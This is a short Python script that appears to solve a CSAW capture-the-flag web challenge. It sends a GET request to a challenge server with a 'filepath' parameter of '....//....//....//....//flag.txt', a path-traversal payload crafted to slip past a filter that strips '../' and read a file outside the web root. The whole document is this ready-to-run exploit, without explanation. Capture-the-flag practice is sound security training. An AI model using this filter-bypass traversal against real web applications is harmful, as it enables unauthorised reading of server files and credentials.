import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', default='web.red.csaw.io', nargs='?')
parser.add_argument('port', default='5000', nargs='?')
args = parser.parse_args()

r = requests.get(
    'http://{}:{}/'.format(args.host, args.port),
    params={'filepath': '....//....//....//....//flag.txt'})
print(r.text)
